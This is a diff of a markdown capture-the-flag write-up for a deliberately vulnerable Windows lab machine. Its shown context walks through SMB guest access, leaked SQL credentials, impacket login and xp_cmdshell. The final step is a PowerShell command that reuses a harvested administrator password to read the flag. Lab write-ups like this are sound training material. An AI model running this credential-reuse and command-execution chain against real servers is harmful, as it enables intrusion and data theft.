@@ -37,7 +37,6 @@ The `-T4` flag is there to ensure that the scan is fast. The range is between `0
 The `-oN` flag tells the tool to save the scan to a file, in this case `nmap_scan.txt` in the same directory.
 Reviewing the scan output, we see that that the machine is a 2019 Windows Server  and has a SQL Server 2017 instance listening on port 1433:
 
-
 ```bash
 cat nmap_scan.txt
  
@@ -50,7 +49,7 @@ PORT     STATE SERVICE      VERSION
 ... 
 ```
 
-If we scroll down a bit more, we can see that the target machine discovery was done using the [SMB (Server Message Block)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831795(v=ws.11)) running on port 445 which is a protocol for shared files and folders in a network: 
+If we scroll down a bit more, we can see that the target machine discovery was done using the [SMB (Server Message Block)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831795(v=ws.11)) running on port 445 which is a protocol for shared files and folders in a network:
 
 ```bash
 cat nmap_scan.txt
@@ -66,7 +65,6 @@ Host script results:
 ```
 
 This is the protocol that allows us to access remote shared network drives from Windows Explorer by inserting `\\REMOTE_IP\SHARE_NAME` in the address bar. SMB is known to have many vulnerabilities (e.g. [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue), [ADV200005](https://msrc.microsoft.com/update-guide/vulnerability/ADV200005)) so my intuition guided me to use this protocol to gain more information about the system. Also, we can see pretty clearly that the guest user is enabled which inherently means that there’s no need for a password!
-
 
 ## Getting Credentials using `smbclient`
 
@@ -149,7 +147,7 @@ I found that there’s some type of configuration file named ‘prod.dtsConfig�
 smb: \> more prod.dtsConfig
 ```
 
-```xml
+```markup
 <DTSConfiguration>                                                                                                                     
     <DTSConfigurationHeading>                                                                                                          
         <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.201
@@ -164,7 +162,7 @@ ist Security Info=True;Auto Translate=False;</ConfiguredValue>
 
 Looks like we got some valuable information in this XML file. We can see in the `ConfiguredData` node that we have credentials which seem to belong to the SQL Server service:
 
-```xml
+```markup
 <ConfiguredValue>...;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;...</ConfiguredValue>
 ```
 
@@ -282,7 +280,6 @@ OpenSSL.SSL.Error: [('SSL routines', 'state_machine', 'internal error')]
 From the stacktrace, the issue is caused by a problem in the SSL handshake pointing to the OpenSSL library.
 Doing some research, I found that [this problem](https://github.com/SecureAuthCorp/impacket/issues/856) also happened to other people and someone had found [a solution by modifying the TLS version from v1 to v2](https://github.com/SecureAuthCorp/impacket/issues/856#issuecomment-729880208). I performed the same changes in the `~/.local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket/tds.py` and reran the same command:
 
-
 ```bash
 mssqlclient.py $username:$password@$ip -debug
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -290,7 +287,6 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] Encryption required, switching to TLS
 [-] ERROR(ARCHETYPE): Line 1: Login failed for user 'sql_svc'.
 ```
-
 
 This time around I got a different error message, a failed login with the user `sql_svc`. I found a way around that by specifying the `-windows-auth` flag which enables using [Kerberos\Windows authentication](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode?view=sql-server-ver15#connecting-through-windows-authentication):
 
@@ -310,7 +306,6 @@ SQL>
 ```
 
 I had an SQL shell! But I was lost at this point. I had no idea what to do from here as I have very limited knowledge using SQL Server administration aside from writing queries and creating database resources. I had to take a step back to review and research this.
-
 
 ## Running System Commands from SQL Server Shell
 
@@ -426,7 +421,7 @@ net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
 ```
 
 The command [maps the T drive to the backups share using the administrator account](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)). And we can see that the last argument includes the administrator password!
-All that’s left is to either log in with the administrator credentials to SQL Server or find a way to run a command as the administrator and then read the contents of the flag. 
+All that’s left is to either log in with the administrator credentials to SQL Server or find a way to run a command as the administrator and then read the contents of the flag.
 The attempt for the former failed:
 
 ```bash
@@ -462,10 +457,8 @@ db_denydatareader
 db_denydatawriter                               
 ```
 
-
 So I needed to try the latter approach: run the command to read the flag as administrator.
 I did some research and found [a way to do this using PowerShell](https://superuser.com/a/1421775/506517). I ran the following command to specify the administrator credentials and print the contents of the flag:
-
 
 ```sql
 SQL> xp_cmdshell "powershell "$username=\"administrator\";$password=\"MEGACORP_4dm1n!!\";$pass = ConvertTo-SecureString -AsPlainText $Password -Force;$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass;Invoke-Command -ComputerName \"Archetype\" -Credential $Cred -ScriptBlock {Get-Content C:\Users\Administrator\Desktop\root.txt} ""
@@ -474,7 +467,3 @@ output
  
 b91ccec3305e98240082d4474b848528
 ```
-
-
-
-
